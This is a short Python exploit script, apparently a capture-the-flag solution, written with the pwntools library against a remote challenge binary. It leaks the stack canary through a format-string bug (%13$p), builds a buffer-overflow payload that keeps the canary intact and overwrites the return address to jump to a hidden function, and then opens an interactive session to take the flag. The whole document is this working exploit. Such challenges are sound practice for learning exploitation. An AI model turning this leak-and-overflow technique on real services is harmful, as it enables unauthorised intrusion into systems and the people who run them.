from pwn import *

host = ""
port = ""
context.log_level = 'error'
context.arch = 'amd64'  # Set architecture to 64-bit

p = remote(host, port)

# Step 1: Leak the canary using format string vulnerability
# The canary is typically at a specific offset on the stack
# We need to find the right offset (let's try common offsets)

msg = p.recv()  # Receive "Tell me your name: "
print(msg.decode())

# Leak canary - adjust offset if needed (try %13$p, %15$p, %17$p, etc.)
format_str = b"%13$p"
p.sendline(format_str)

response = p.recvuntil(b"Now tell me a joke: ")
print(response.decode())

# Extract canary from response
# The canary should be in the output before "Now tell me a joke:"
lines = response.split(b'\n')
canary_line = lines[0]
print(f"Canary line: {canary_line}")

try:
    canary = int(canary_line.strip(), 16)
    print(f"Leaked canary: {hex(canary)}")
except:
    print("Failed to leak canary, trying different offset...")
    p.close()
    exit()

# Step 2: Build payload for buffer overflow
# Stack layout for start_challenge:
# local_38 [40 bytes] - our input buffer
# padding [some bytes to align to canary]
# local_10 [8 bytes] - canary
# saved RBP [8 bytes]
# return address [8 bytes] - we want to overwrite this

# Address of south_africa function (adjust based on your binary)
south_africa_addr = 0x40127b  # from your disassembly

payload = b"A" * 40           # Fill local_38 (40 bytes)
payload += p64(canary)        # Restore canary (8 bytes in 64-bit)
payload += b"B" * 8           # Saved RBP (8 bytes)
payload += p64(south_africa_addr)  # Return address to south_africa

p.sendline(payload)

# Get the flag
p.interactive()